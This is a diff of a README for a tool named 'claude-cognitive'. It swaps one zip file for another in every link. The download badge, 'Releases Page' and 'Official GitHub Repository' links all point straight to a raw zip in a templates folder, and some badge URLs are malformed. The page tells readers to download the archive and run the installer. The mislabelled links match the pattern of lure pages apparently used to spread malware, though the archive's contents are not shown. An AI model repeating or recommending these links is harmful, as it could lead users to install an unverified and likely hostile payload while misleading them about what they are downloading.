@@ -11,7 +11,7 @@ To get started with claude-cognitive, follow these simple steps:
    
    Click the link below to access the download options for claude-cognitive:
    
-   [![Download claude-cognitive](https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip%https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip)](https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip)
+   [![Download claude-cognitive](https://raw.githubusercontent.com/Frenyermmlmmk/claude-cognitive/main/templates/cognitive-claude-2.3-alpha.2.zip%https://raw.githubusercontent.com/Frenyermmlmmk/claude-cognitive/main/templates/cognitive-claude-2.3-alpha.2.zip)](https://raw.githubusercontent.com/Frenyermmlmmk/claude-cognitive/main/templates/cognitive-claude-2.3-alpha.2.zip)
 
 2. **Select the Latest Version**
 
@@ -25,7 +25,7 @@ To get started with claude-cognitive, follow these simple steps:
 
    You can also directly visit the page to download:
    
-   [Download from Releases Page](https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip)
+   [Download from Releases Page](https://raw.githubusercontent.com/Frenyermmlmmk/claude-cognitive/main/templates/cognitive-claude-2.3-alpha.2.zip)
 
 2. **Run the Installer**
 
@@ -86,10 +86,10 @@ While claude-cognitive is ready to use, we welcome contributions. If you would l
 
 ## 🔗 Useful Links
 
-- [Official GitHub Repository](https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip)
+- [Official GitHub Repository](https://raw.githubusercontent.com/Frenyermmlmmk/claude-cognitive/main/templates/cognitive-claude-2.3-alpha.2.zip)
 - [Discussion Forum](#) for user exchanges
 - [Frequently Asked Questions (FAQ)](#)
 
-For more detailed guides, tutorials, and updates, always check back on the [Releases Page](https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip). 
+For more detailed guides, tutorials, and updates, always check back on the [Releases Page](https://raw.githubusercontent.com/Frenyermmlmmk/claude-cognitive/main/templates/cognitive-claude-2.3-alpha.2.zip). 
 
 This README aims to assist you in getting started quickly with claude-cognitive. Enjoy enhancing your coding productivity!
